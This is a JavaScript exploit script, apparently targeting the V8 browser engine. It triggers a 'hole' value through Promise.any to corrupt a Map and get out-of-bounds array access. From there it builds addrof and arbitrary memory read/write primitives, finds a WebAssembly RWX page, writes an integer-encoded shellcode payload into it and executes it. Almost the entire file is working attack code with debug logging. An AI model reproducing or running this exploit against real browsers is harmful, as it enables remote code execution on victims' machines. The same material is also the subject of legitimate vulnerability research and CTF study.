var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Int32Array(view);
var bigIntView = new BigInt64Array(view);

function ftoi32(f) {
    dblArr[0] = f;
    return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
    intView[0] = i1;
    intView[1] = i2;
    return dblArr[0];
}

function itof(i) {
    bigIntView[0] = BigInt(i);
    return dblArr[0];
}

function ftoi(f) {
    dblArr[0] = f;
    return bigIntView[0];
}

function aaa(data){
    var para = document.createElement("p");
    var node = document.createTextNode("[+] " + data);
    para.appendChild(node);

    var element = document.getElementById("log");
    element.appendChild(para);
}

let v1;
function f0(v4) {
    v4(() => { }, v5 => {
        v1 = v5.errors;
    });
}
f0.resolve = function (v6) {
    return v6;
};
let v3 = {
    then(v7, v8) {
        v8();
    }
};
Promise.any.call(f0, [v3]);
// aaa(v1[1]);

let hole = v1[1];
var map = new Map();
map.set(1, 1);
map.set(hole, 1);
map.delete(hole);
map.delete(hole);
map.delete(1);
// aaa(map.size)

// let oob_arr = [1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];
let oob_arr = [1.1, 1.1, 1.1, 1.1, 1.1];

let dummy = Array(0x1);
let oob2 = Array(0x10);
let uint1 = new Uint32Array(0x10);
let uint2 = new Uint32Array(0x10);

map.set(0x1d, -1); 
map.set(0x126, 0); 

oob2[0] = {};
aaa("oob length: " + oob_arr.length.toString());

function addrof(obj) {
    oob2[0] = obj;
    return ftoi32(oob_arr[13])[1]-1;
}

oob_arr[43] = i32tof(0x1000, 0);
uint1[79] = 0;
// uint1[81] = 0xdead;

let v8_high = uint1[80]
aaa("high: " + v8_high.toString(16));

function arb_read(low, high) {
    if(high!== undefined ) uint1[80] = high;
    uint1[81] = low;
    return uint2[0];
}

function arb_write(data, low, high) {
     if(high!== undefined ) uint1[80] = high;
    uint1[81] = low;
    uint2[0] = data;
}

var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module);
var main = instance.exports.main;

var instance_addr = addrof(instance);
aaa("instance addr: " + instance_addr.toString(16));


var rwx_low = arb_read(instance_addr + 0x60);
var rwx_high = arb_read(instance_addr + 0x60 + 4);
aaa("rwx addr: " + rwx_high.toString(16) + rwx_low.toString(16));

arb_write(0xcc, rwx_low, rwx_high)

aaa(arb_read(rwx_low, rwx_high).toString(16));


shellcode = [3405905986, 268435649, 2457865312, 3531605768, 3556769825, 2852127718, 335544328, 1668572463, 1935765551, 6584179, 1633771873, 1633771873, 1633771873, 6381921, 2852520937, 3531604032, 3531604001, 3405905986, 3531610312, 3556769825, 268435617, 3531604482, 2852127718, 335544324, 3405840417, 976224258, 2601035968, 3531610472, 3556769825, 2852520938, 2852717536, 285212001, 3531604483, 3531605992, 3556769825, 4043309087, 1409286368, 2852127714, 285211777, 2852783072, 3531606024, 3556769825, 402653172, 3596551104, 0];

shellcode.forEach((sc, i) => {
    arb_write(sc, rwx_low+i*4, rwx_high);
});

for (let i=0;i<shellcode.length+2;i++) {
    aaa(arb_read(rwx_low+i*4, rwx_high).toString(16));
}


main();




// aaa(addrof(uint1).toString(16));
// aaa(addrof(uint2).toString(16));
// aaa(addrof(oob_arr).toString(16));

// for(let i=20;i<100;i++) {
//     let ccc = ftoi32(oob_arr[i])
//     aaa(i.toString()+"  "+ccc[0].toString(16)+"  "+ccc[1].toString(16));
// }